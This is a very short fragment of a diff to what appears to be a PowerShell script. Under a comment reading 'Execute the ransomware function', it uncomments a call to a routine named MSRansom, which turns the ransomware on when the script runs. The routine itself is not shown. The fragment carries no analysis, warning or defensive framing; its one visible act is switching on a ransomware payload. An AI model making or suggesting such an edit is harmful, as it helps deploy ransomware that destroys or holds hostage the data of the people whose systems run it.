@@ -620,5 +620,5 @@ if ($unlockResult) {
 }
 
 # Execute the ransomware function
+MSRansom
 
-#MSRansom
